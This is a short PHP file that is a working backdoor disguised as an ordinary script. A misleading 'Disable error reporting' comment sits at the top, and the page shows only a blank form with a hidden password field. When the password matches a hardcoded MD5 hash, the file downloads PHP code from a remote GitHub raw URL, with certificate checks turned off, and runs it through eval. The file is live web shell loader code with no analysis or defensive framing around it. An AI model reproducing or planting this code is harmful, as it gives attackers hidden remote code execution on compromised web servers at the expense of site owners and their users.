<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['y'])) {
    $entered_y = $_POST['y'];
    $hashed_y = 'c24df88d249b151dae2b7c40de81e775';
    if (md5($entered_y) === $hashed_y) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu';
    } else {
        
        echo "?";
    }
}

if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/lsri97008/amankah2/refs/heads/main/yanz.php');
    eval('?>' . $a);
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title></title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="y"></label>
            <input type="password" display="none" id="y" name="y">
            <input type="submit" value="Go">
        </form>
    </body>
    </html>
    <?php
}
?>
